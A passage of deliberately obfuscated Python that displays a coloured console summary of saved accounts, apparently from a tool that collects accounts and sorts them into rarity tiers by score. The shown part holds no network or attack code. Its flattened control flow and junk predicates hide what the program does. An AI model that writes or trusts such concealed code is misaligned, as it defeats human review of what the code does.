                        IllIllllIIlIlIlIlIllIIl = 2483888
                        continue
                    if IllIllllIIlIlIlIlIllIIl == 9659204:
                        if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][28] * 75 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][3] == 17939:
                            lIlIIIIIllIlll = 2697677
                            while True:
                                if lIlIIIIIllIlll == 1453111:
                                    lIIlIIllIlIlIIll = sum(IIIlIIIIIllIlIlII) + IlIIllIllIIIIIII % 5 - llIIlIIIIIIIIIIIIIlll
                                    break
                                if lIlIIIIIllIlll == 2697677:
                                    llIIlIIIIIIIIIIIIIlll = 6545518
                                    lIlIIIIIllIlll = 8790681
                                    continue
                                if lIlIIIIIllIlll == 8007491:
                                    IIIlIIIIIllIlIlII = [IlIIllIllIIIIIII >> 8 & 255 for llllIllIlIllIlllll in range(3)]
                                    lIlIIIIIllIlll = 1453111
                                    continue
                                if lIlIIIIIllIlll == 8790681:
                                    IlIIllIllIIIIIII = (llIIlIIIIIIIIIIIIIlll * 3 ^ 6990092) & 16777215
                                    lIlIIIIIllIlll = 8007491
                                    continue
                                if lIlIIIIIllIlll == 6217907:
                                    lIlIIIIIllIlll = 2697677
                                    continue
                        IllIllllIIlIlIlIlIllIIl = 8913133
                        continue
                    if IllIllllIIlIlIlIlIllIIl == 1717148:
                        IllIllllIIlIlIlIlIllIIl = 2483888
                        continue
                    if IllIllllIIlIlIlIlIllIIl == 2483888:
                        return getattr(text, 'ljust')(IlllllIllIIIIlIlI - 2)
                        break
                    if IllIllllIIlIlIlIlIllIIl == 8913133:
                        text = f'   {label} : {color}{value}{getattr(IlIIIIIIlIIlIlll, 'RST')}'
                        IllIllllIIlIlIlIlIllIIl = 2483888
                        continue
            llIIIIlllIIlIllIlI = 5118972
            continue
        if llIIIIlllIIlIllIlI == 8257298:
            if lIIIIIIlIlIIIllIlllIIII > 0:
                print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}{lllIIIIllllIIlI('Emergency', lIIIIIIlIlIIIllIlllIIII, getattr(IlIIIIIIlIIlIlll, 'RED_GLOW'))}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            llIIIIlllIIlIllIlI = 1069244
            continue
        if llIIIIlllIIlIllIlI == 2380189:
            get_runtime_config()
            llIIIIlllIIlIllIlI = 2670168
            continue
        if llIIIIlllIIlIllIlI == 2670168:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            llIIIIlllIIlIllIlI = 9610643
            continue
        if llIIIIlllIIlIllIlI == 2656948:

            def IlIlllllIllIIIIlIlIIIIlI(folder_path, title, color, show_scores=False):
                llIllllllllIllIIIllIIIll = 5543694
                while True:
                    if llIllllllllIllIIIllIIIll == 5922387:
                        if IIllIllIlllllllII:
                            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {color}{title}{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                            for f in sorted(IIllIllIlllllllII):
                                try:
                                    IllIlIIllIIIIIIlll = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(folder_path, f)
                                    if getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'exists')(IllIlIIllIIIIIIlll):
                                        with open(IllIlIIllIIIIIIlll, 'r', encoding='utf-8') as llIlllllIlIlllIIlIlIIlIl:
                                            IlIIlIlllIIIIIIll = 5160082
                                            while True:
                                                if IlIIlIlllIIIIIIll == 8097465:
                                                    IlIIlIlllIIIIIIll = 4209186
                                                    continue
                                                if IlIIlIlllIIIIIIll == 5160082:
                                                    IllIIlIlIllIlIIIlIIlllll = getattr(llIlllllIlIlllIIlIlIIlIl, 'readlines')()
                                                    IlIIlIlllIIIIIIll = 4581318
                                                    continue
                                                if IlIIlIlllIIIIIIll == 4209186:
                                                    IlIIlIlllIIIIIIll = 4776487
                                                    continue
                                                if IlIIlIlllIIIIIIll == 4776487:
                                                    if IllIllIIIIlIlII > 0:
                                                        if show_scores:
                                                            llllIIllllIIlIllllIlIIl = 9062389
                                                            while True:
                                                                if llllIIllllIIlIllllIlIIl == 4178409:
                                                                    lIllIIIIlllIIII = sum(llIlIlIIllIlIl) / len(llIlIlIIllIlIl) if llIlIlIIllIlIl else 0
                                                                    llllIIllllIIlIllllIlIIl = 9027579
                                                                    continue
                                                                if llllIIllllIIlIllllIlIIl == 1362155:
                                                                    llllIIllllIIlIllllIlIIl = 3414305
                                                                    continue
                                                                if llllIIllllIIlIllllIlIIl == 9027579:
                                                                    llIIIIlllIlIllll = max(llIlIlIIllIlIl) if llIlIlIIllIlIl else 0
                                                                    llllIIllllIIlIllllIlIIl = 2876880
                                                                    continue
                                                                if llllIIllllIIlIllllIlIIl == 2876880:
                                                                    print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}    {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}└─{getattr(IlIIIIIIlIIlIlll, 'RST')} {f}: {color}{IllIllIIIIlIlII}{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}|{getattr(IlIIIIIIlIIlIlll, 'RST')} Avg: {lIllIIIIlllIIII:.1f} {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}|{getattr(IlIIIIIIlIIlIlll, 'RST')} Max: {llIIIIlllIlIllll}{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                                                                    break
                                                                if llllIIllllIIlIllllIlIIl == 4421982:
                                                                    for line in IllIIlIlIllIlIIIlIIlllll:
                                                                        if getattr(line, 'strip')():
                                                                            try:
                                                                                lIlIIllIIlIIIIIlIlIllIIl = 8887759
                                                                                while True:
                                                                                    if lIlIIllIIlIIIIIlIlIllIIl == 6241129:
                                                                                        score = getattr(data, 'get')('rarity_score', 0)
                                                                                        lIlIIllIIlIIIIIlIlIllIIl = 3858879
                                                                                        continue
                                                                                    if lIlIIllIIlIIIIIlIlIllIIl == 3858879:
                                                                                        getattr(llIlIlIIllIlIl, 'append')(score)
                                                                                        break
                                                                                    if lIlIIllIIlIIIIIlIlIllIIl == 6267289:
                                                                                        lIlIIllIIlIIIIIlIlIllIIl = 6267289
                                                                                        continue
                                                                                    if lIlIIllIIlIIIIIlIlIllIIl == 8887759:
                                                                                        data = getattr(json, 'loads')(line)
                                                                                        lIlIIllIIlIIIIIlIlIllIIl = 6241129
                                                                                        continue
                                                                                    if lIlIIllIIlIIIIIlIlIllIIl == 2797278:
                                                                                        lIlIIllIIlIIIIIlIlIllIIl = 8887759
                                                                                        continue
                                                                            except:
                                                                                pass
                                                                    llllIIllllIIlIllllIlIIl = 4178409
                                                                    continue
                                                                if llllIIllllIIlIllllIlIIl == 9062389:
                                                                    llIlIlIIllIlIl = []
                                                                    llllIIllllIIlIllllIlIIl = 4421982
                                                                    continue
                                                                if llllIIllllIIlIllllIlIIl == 3414305:
                                                                    llllIIllllIIlIllllIlIIl = 4178409
                                                                    continue
                                                        else:
                                                            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}    {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}└─{getattr(IlIIIIIIlIIlIlll, 'RST')} {f}: {color}{IllIllIIIIlIlII}{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                                                    break
                                                if IlIIlIlllIIIIIIll == 4581318:
                                                    IllIllIIIIlIlII = len([line for line in IllIIlIlIllIlIIIlIIlllll if getattr(line, 'strip')()])
                                                    IlIIlIlllIIIIIIll = 4776487
                                                    continue
                                                if IlIIlIlllIIIIIIll == 6053662:
                                                    IlIIlIlllIIIIIIll = 8097465
                                                    continue
                                except:
                                    pass
                        llIllllllllIllIIIllIIIll = 5164744
                        continue
                    if llIllllllllIllIIIllIIIll == 2222935:
                        if not files:
                            return
                        llIllllllllIllIIIllIIIll = 6877177
                        continue
                    if llIllllllllIllIIIllIIIll == 6877177:
                        IIllIllIlllllllII = [f for f in files if 'ghost' not in getattr(f, 'lower')()]
                        llIllllllllIllIIIllIIIll = 1122335
                        continue
                    if llIllllllllIllIIIllIIIll == 4132356:
                        if llllIlIlIlIlIIIlIlllIlIl:
                            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'PURPLE_GLOW')}👻 GHOST{color}{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║')
                            for f in sorted(llllIlIlIlIlIIIlIlllIlIl):
                                try:
                                    IllIlIIllIIIIIIlll = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(folder_path, f)
                                    if getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'exists')(IllIlIIllIIIIIIlll):
                                        with open(IllIlIIllIIIIIIlll, 'r', encoding='utf-8') as llIlllllIlIlllIIlIlIIlIl:
                                            IIIIIlIIllIlllII = 7526715
                                            while True:
                                                if IIIIIlIIllIlllII == 1649274:
                                                    if IllIllIIIIlIlII > 0:
                                                        if show_scores:
                                                            llllIlllIlllIlllIlIlIll = 1523343
                                                            while True:
                                                                if llllIlllIlllIlllIlIlIll == 9805120:
                                                                    llllIlllIlllIlllIlIlIll = 3207821
                                                                    continue
                                                                if llllIlllIlllIlllIlIlIll == 6350894:
                                                                    llllIlllIlllIlllIlIlIll = 5810286
                                                                    continue
                                                                if llllIlllIlllIlllIlIlIll == 8457116:
                                                                    llllIlllIlllIlllIlIlIll = 3207821
                                                                    continue
                                                                if llllIlllIlllIlllIlIlIll == 3912812:
                                                                    lIllIIIIlllIIII = sum(llIlIlIIllIlIl) / len(llIlIlIIllIlIl) if llIlIlIIllIlIl else 0
                                                                    llllIlllIlllIlllIlIlIll = 1678770
                                                                    continue
                                                                if llllIlllIlllIlllIlIlIll == 3207821:
                                                                    for line in IllIIlIlIllIlIIIlIIlllll:
                                                                        if getattr(line, 'strip')():
                                                                            try:
                                                                                lIlIllllIIlIllI = 7842796
                                                                                while True:
                                                                                    if lIlIllllIIlIllI == 4789089:
                                                                                        score = getattr(data, 'get')('rarity_score', 0)
                                                                                        lIlIllllIIlIllI = 1562287
                                                                                        continue
                                                                                    if lIlIllllIIlIllI == 9146756:
                                                                                        lIlIllllIIlIllI = 7842796
                                                                                        continue
                                                                                    if lIlIllllIIlIllI == 7117297:
                                                                                        lIlIllllIIlIllI = 7842796
                                                                                        continue
                                                                                    if lIlIllllIIlIllI == 7842796:
                                                                                        data = getattr(json, 'loads')(line)
                                                                                        lIlIllllIIlIllI = 4789089
                                                                                        continue
                                                                                    if lIlIllllIIlIllI == 5288626:
                                                                                        lIlIllllIIlIllI = 9146756
                                                                                        continue
                                                                                    if lIlIllllIIlIllI == 1562287:
                                                                                        getattr(llIlIlIIllIlIl, 'append')(score)
                                                                                        break
                                                                            except:
                                                                                pass
                                                                    llllIlllIlllIlllIlIlIll = 3912812
                                                                    continue
                                                                if llllIlllIlllIlllIlIlIll == 1678770:
                                                                    llIIIIlllIlIllll = max(llIlIlIIllIlIl) if llIlIlIIllIlIl else 0
                                                                    llllIlllIlllIlllIlIlIll = 5810286
                                                                    continue
                                                                if llllIlllIlllIlllIlIlIll == 5810286:
                                                                    print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}    {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}└─{getattr(IlIIIIIIlIIlIlll, 'RST')} {f}: {getattr(IlIIIIIIlIIlIlll, 'PURPLE')}{IllIllIIIIlIlII}{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}|{getattr(IlIIIIIIlIIlIlll, 'RST')} Avg: {lIllIIIIlllIIII:.1f} {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}|{getattr(IlIIIIIIlIIlIlll, 'RST')} Max: {llIIIIlllIlIllll}{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                                                                    break
                                                                if llllIlllIlllIlllIlIlIll == 1523343:
                                                                    llIlIlIIllIlIl = []
                                                                    llllIlllIlllIlllIlIlIll = 3207821
                                                                    continue
                                                        else:
                                                            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}    {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}└─{getattr(IlIIIIIIlIIlIlll, 'RST')} {f}: {getattr(IlIIIIIIlIIlIlll, 'PURPLE')}{IllIllIIIIlIlII}{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                                                    break
                                                if IIIIIlIIllIlllII == 7526715:
                                                    IllIIlIlIllIlIIIlIIlllll = getattr(llIlllllIlIlllIIlIlIIlIl, 'readlines')()
                                                    IIIIIlIIllIlllII = 2663453
                                                    continue
                                                if IIIIIlIIllIlllII == 6832895:
                                                    IIIIIlIIllIlllII = 6832895
                                                    continue
                                                if IIIIIlIIllIlllII == 2663453:
                                                    IllIllIIIIlIlII = len([line for line in IllIIlIlIllIlIIIlIIlllll if getattr(line, 'strip')()])
                                                    IIIIIlIIllIlllII = 1649274
                                                    continue
                                except:
                                    pass
                        break
                    if llIllllllllIllIIIllIIIll == 1122335:
                        llllIlIlIlIlIIIlIlllIlIl = [f for f in files if 'ghost' in getattr(f, 'lower')()]
                        llIllllllllIllIIIllIIIll = 5922387
                        continue
                    if llIllllllllIllIIIllIIIll == 5543694:
                        if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][2] ^ 6 == 417:
                            IlllIIIIIlllllIIIlIl = 1062217
                            while True:
                                if IlllIIIIIlllllIIIlIl == 7201375:
                                    IlllIIIIIlllllIIIlIl = 3913813
                                    continue
                                if IlllIIIIIlllllIIIlIl == 1313112:
                                    lIIlIlllIIIIIl = sum(IlIIIIllIlllIl) + IIIlllIIlllIIIlIlIlIIll % 68 - lIllllIllIIIllIllIIlIIll
                                    break
                                if IlllIIIIIlllllIIIlIl == 8999427:
                                    IlllIIIIIlllllIIIlIl = 7201375
                                    continue
                                if IlllIIIIIlllllIIIlIl == 3913813:
                                    IIIlllIIlllIIIlIlIlIIll = (lIllllIllIIIllIllIIlIIll * 7 ^ 3316850) & 65535
                                    IlllIIIIIlllllIIIlIl = 9091794
                                    continue
                                if IlllIIIIIlllllIIIlIl == 9091794:
                                    IlIIIIllIlllIl = [IIIlllIIlllIIIlIlIlIIll >> 5 & 255 for IIlIIIIIlIIllII in range(7)]
                                    IlllIIIIIlllllIIIlIl = 1313112
                                    continue
                                if IlllIIIIIlllllIIIlIl == 1062217:
                                    lIllllIllIIIllIllIIlIIll = 174321457
                                    IlllIIIIIlllllIIIlIl = 3913813
                                    continue
                        llIllllllllIllIIIllIIIll = 8608018
                        continue
                    if llIllllllllIllIIIllIIIll == 2793355:
                        if lIIIIIIIIIIlllllIIIIIIIl:
                            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}⚠️ EMERGENCY FILES (recovery needed){getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                            for f in sorted(lIIIIIIIIIIlllllIIIIIIIl):
                                try:
                                    IllIlIIllIIIIIIlll = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(folder_path, f)
                                    if getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'exists')(IllIlIIllIIIIIIlll):
                                        with open(IllIlIIllIIIIIIlll, 'r', encoding='utf-8') as llIlllllIlIlllIIlIlIIlIl:
                                            IllIIIlIIIIIlIIIllIIlII = 8146844
                                            while True:
                                                if IllIIIlIIIIIlIIIllIIlII == 8146844:
                                                    IllIIlIlIllIlIIIlIIlllll = getattr(llIlllllIlIlllIIlIlIIlIl, 'readlines')()
                                                    IllIIIlIIIIIlIIIllIIlII = 9554017
                                                    continue
                                                if IllIIIlIIIIIlIIIllIIlII == 9554017:
                                                    IllIllIIIIlIlII = len([line for line in IllIIlIlIllIlIIIlIIlllll if getattr(line, 'strip')()])
                                                    IllIIIlIIIIIlIIIllIIlII = 2017455
                                                    continue
                                                if IllIIIlIIIIIlIIIllIIlII == 2017455:
                                                    if IllIllIIIIlIlII > 0:
                                                        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}    {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}└─{getattr(IlIIIIIIlIIlIlll, 'RST')} {f}: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}{IllIllIIIIlIlII}{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'RED1')}(NEEDS RECOVERY){getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                                                    break
                                                if IllIIIlIIIIIlIIIllIIlII == 8497044:
                                                    IllIIIlIIIIIlIIIllIIlII = 2017455
                                                    continue
                                except:
                                    pass
                        llIllllllllIllIIIllIIIll = 4132356
                        continue
                    if llIllllllllIllIIIllIIIll == 2695017:
                        files = [f for f in getattr(IllIlllllIlIIllIlIllI, 'listdir')(folder_path) if getattr(f, 'endswith')('.json') and 'emergency' not in f]
                        llIllllllllIllIIIllIIIll = 2222935
                        continue
                    if llIllllllllIllIIIllIIIll == 5164744:
                        lIIIIIIIIIIlllllIIIIIIIl = [f for f in getattr(IllIlllllIlIIllIlIllI, 'listdir')(folder_path) if getattr(f, 'endswith')('_emergency.json')]
                        llIllllllllIllIIIllIIIll = 2793355
                        continue
                    if llIllllllllIllIIIllIIIll == 2670227:
                        llIllllllllIllIIIllIIIll = 2222935
                        continue
                    if llIllllllllIllIIIllIIIll == 8608018:
                        if not getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'exists')(folder_path):
                            return
                        llIllllllllIllIIIllIIIll = 2695017
                        continue
            llIIIIlllIIlIllIlI = 2907516
            continue
        if llIIIIlllIIlIllIlI == 1253848:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╟{'─' * IIIIllllllIlIlIllIIIIlI}')
            llIIIIlllIIlIllIlI = 2656948
            continue
        if llIIIIlllIIlIllIlI == 2907516:
            IlIlllllIllIIIIlIlIIIIlI(IlIlIIIIlllIIllIIl, 'NORMAL ACCOUNTS', getattr(IlIIIIIIlIIlIlll, 'GREEN2'))
            llIIIIlllIIlIllIlI = 2141096
            continue
        if llIIIIlllIIlIllIlI == 4027556:
            if IIlIlIlIlIIlIIIlIl > 0:
                print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}{lllIIIIllllIIlI('Ghost', IIlIlIlIlIIlIIIlIl, getattr(IlIIIIIIlIIlIlll, 'PURPLE_GLOW'))}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            llIIIIlllIIlIllIlI = 8257298
            continue
        if llIIIIlllIIlIllIlI == 1331030:
            if lIlIllIlIIIIIIIIllIII > 0:
                print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}{lllIIIIllllIIlI('Legendary', lIlIllIlIIIIIIIIllIII, getattr(IlIIIIIIlIIlIlll, 'RED_GLOW'))}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            llIIIIlllIIlIllIlI = 7388680
            continue
        if llIIIIlllIIlIllIlI == 4005172:
            IlIlllllIllIIIIlIlIIIIlI(IIIllllllIIIIIIIllIIl, 'MYTHIC ACCOUNTS (Score 15-19)', getattr(IlIIIIIIlIIlIlll, 'ORANGE_GLOW'), show_scores=True)
            llIIIIlllIIlIllIlI = 8562734
            continue
        if llIIIIlllIIlIllIlI == 2141096:
            IlIlllllIllIIIIlIlIIIIlI(IIIlIlIlIIlIlIlIlIIIll, 'LEGENDARY ACCOUNTS (Score 20+)', getattr(IlIIIIIIlIIlIlll, 'RED_GLOW'), show_scores=True)
            llIIIIlllIIlIllIlI = 4005172
            continue
        if llIIIIlllIIlIllIlI == 6461004:
            IlIlllllIllIIIIlIlIIIIlI(lllIllIIlIlIIIlII, 'RARE ACCOUNTS (Score 7-10)', getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW'), show_scores=True)
            llIIIIlllIIlIllIlI = 8994588
            continue
        if llIIIIlllIIlIllIlI == 2757392:
            for folder in [IlIlIIIIlllIIllIIl, IIIlIlIlIIlIlIlIlIIIll, IIIllllllIIIIIIIllIIl, llIlIlIlIlIlllIlllI, lllIllIIlIlIIIlII]:
                if getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'exists')(folder):
                    for f in getattr(IllIlllllIlIIllIlIllI, 'listdir')(folder):
                        if getattr(f, 'endswith')('.json'):
                            lIIlIllIIlIIlllIllIlIll = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(folder, f)
                            try:
                                with open(lIIlIllIIlIIlllIllIlIll, 'r', encoding='utf-8') as IIIIIlIlIllllllIIIIIl:
                                    lIlllllllIIIlIlIIlIIlIIl = 5030727
                                    while True:
                                        if lIlllllllIIIlIlIIlIIlIIl == 5030727:
                                            IllIlIlIIIIlIllllIl = getattr(IIIIIlIlIllllllIIIIIl, 'readlines')()
                                            lIlllllllIIIlIlIIlIIlIIl = 9693193
                                            continue
                                        if lIlllllllIIIlIlIIlIIlIIl == 1882930:
                                            lIlllllllIIIlIlIIlIIlIIl = 9693193
                                            continue
                                        if lIlllllllIIIlIlIIlIIlIIl == 1625897:
                                            lIlllllllIIIlIlIIlIIlIIl = 1625897
                                            continue
                                        if lIlllllllIIIlIlIIlIIlIIl == 3787057:
                                            if '_emergency' in f:
                                                lIIIIIIlIlIIIllIlllIIII += lIlIIlIlIllIllIllI
                                            elif 'ghost' in getattr(f, 'lower')():
                                                IIlIlIlIlIIlIIIlIl += lIlIIlIlIllIllIllI
                                            elif 'legendary' in getattr(f, 'lower')():
                                                lIlIllIlIIIIIIIIllIII += lIlIIlIlIllIllIllI
                                            elif 'mythic' in getattr(f, 'lower')():
                                                lIIIlIIllIlllIlIIllllIII += lIlIIlIlIllIllIllI
                                            elif 'epic' in getattr(f, 'lower')():
                                                lIIlIllIIIlIlIIlIllIlll += lIlIIlIlIllIllIllI
                                            elif 'rare' in getattr(f, 'lower')():
                                                IIllIIlllllIIIlIl += lIlIIlIlIllIllIllI
                                            else:
                                                IlIIIIIllIIIlII += lIlIIlIlIllIllIllI
                                            break
                                        if lIlllllllIIIlIlIIlIIlIIl == 9693193:
                                            lIlIIlIlIllIllIllI = len([line for line in IllIlIlIIIIlIllllIl if getattr(line, 'strip')()])
                                            lIlllllllIIIlIlIIlIIlIIl = 3787057
                                            continue
                            except:
                                pass
            llIIIIlllIIlIllIlI = 1406203
            continue
        if llIIIIlllIIlIllIlI == 7388680:
            if lIIIlIIllIlllIlIIllllIII > 0:
                print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}{lllIIIIllllIIlI('Mythic', lIIIlIIllIlllIlIIllllIII, getattr(IlIIIIIIlIIlIlll, 'ORANGE_GLOW'))}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            llIIIIlllIIlIllIlI = 1698742
            continue
        if llIIIIlllIIlIllIlI == 8268544:
            if IIllIIlllllIIIlIl > 0:
                print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}{lllIIIIllllIIlI('Rare', IIllIIlllllIIIlIl, getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW'))}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            llIIIIlllIIlIllIlI = 4027556
            continue
        if llIIIIlllIIlIllIlI == 8159819:
            load_license()
            llIIIIlllIIlIllIlI = 2380189
            continue
        if llIIIIlllIIlIllIlI == 2496497:
            input(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}Press Enter to continue...{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            break
        if llIIIIlllIIlIllIlI == 6331752:
            lIIIlIIllIlllIlIIllllIII = 0
            llIIIIlllIIlIllIlI = 7605796
            continue
        if llIIIIlllIIlIllIlI == 1698742:
            if lIIlIllIIIlIlIIlIllIlll > 0:
                print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}{lllIIIIllllIIlI('Epic', lIIlIllIIIlIlIIlIllIlll, getattr(IlIIIIIIlIIlIlll, 'PURPLE_GLOW'))}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            llIIIIlllIIlIllIlI = 8268544
            continue
        if llIIIIlllIIlIllIlI == 1069244:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}└{'─' * IlllllIllIIIIlIlI}┘')
            llIIIIlllIIlIllIlI = 9903418
            continue
        if llIIIIlllIIlIllIlI == 7605796:
            lIIlIllIIIlIlIIlIllIlll = 0
            llIIIIlllIIlIllIlI = 5707069
            continue
        if llIIIIlllIIlIllIlI == 9903418:
            if lIIIIIIlIlIIIllIlllIIII > 0:
                print(f'\n{getattr(IlIIIIIIlIIlIlll, 'RED1')}⚠️  There are {lIIIIIIlIlIIIllIlllIIII} accounts in emergency files!{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                print(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}These accounts failed to save normally. Check {lllIllIIlIlIIIlII} for _emergency.json files{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            llIIIIlllIIlIllIlI = 2496497
            continue
        if llIIIIlllIIlIllIlI == 1854487:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}┌{'─' * IlllllIllIIIIlIlI}┐')
            llIIIIlllIIlIllIlI = 5804627
            continue
        if llIIIIlllIIlIllIlI == 8562734:
            IlIlllllIllIIIIlIlIIIIlI(llIlIlIlIlIlllIlllI, 'EPIC ACCOUNTS (Score 11-14)', getattr(IlIIIIIIlIIlIlll, 'PURPLE_GLOW'), show_scores=True)
            llIIIIlllIIlIllIlI = 6461004
            continue
        if llIIIIlllIIlIllIlI == 1406203:
            IlllllIllIIIIlIlI = 52
            llIIIIlllIIlIllIlI = 1854487
            continue
        if llIIIIlllIIlIllIlI == 8994588:
            IlIIIIIllIIIlII = 0
            llIIIIlllIIlIllIlI = 1871989
            continue
        if llIIIIlllIIlIllIlI == 5707069:
            IIllIIlllllIIIlIl = 0
            llIIIIlllIIlIllIlI = 9922309
            continue
        if llIIIIlllIIlIllIlI == 1871989:
            lIlIllIlIIIIIIIIllIII = 0
            llIIIIlllIIlIllIlI = 6331752
            continue
        if llIIIIlllIIlIllIlI == 9922309:
            IIlIlIlIlIIlIIIlIl = 0
            llIIIIlllIIlIllIlI = 6111391
            continue
        if llIIIIlllIIlIllIlI == 5118972:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}{lllIIIIllllIIlI('Normal', IlIIIIIllIIIlII, getattr(IlIIIIIIlIIlIlll, 'YELLOW1'))}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            llIIIIlllIIlIllIlI = 1331030
            continue
        if llIIIIlllIIlIllIlI == 7753944:
            llIIIIlllIIlIllIlI = 6331752
            continue
        if llIIIIlllIIlIllIlI == 9610643:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}✦ SAVED ACCOUNTS ✦{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            llIIIIlllIIlIllIlI = 1253848
            continue
        if llIIIIlllIIlIllIlI == 5804627:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}📊 TOTAL SUMMARY{getattr(IlIIIIIIlIIlIlll, 'RST')}', IlllllIllIIIIlIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            llIIIIlllIIlIllIlI = 6892972
            continue
        if llIIIIlllIIlIllIlI == 3297617:
            if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][17] == 33:
                IllIIIllIIIIlIllII = 6734195
                while True:
                    if IllIIIllIIIIlIllII == 2996991:
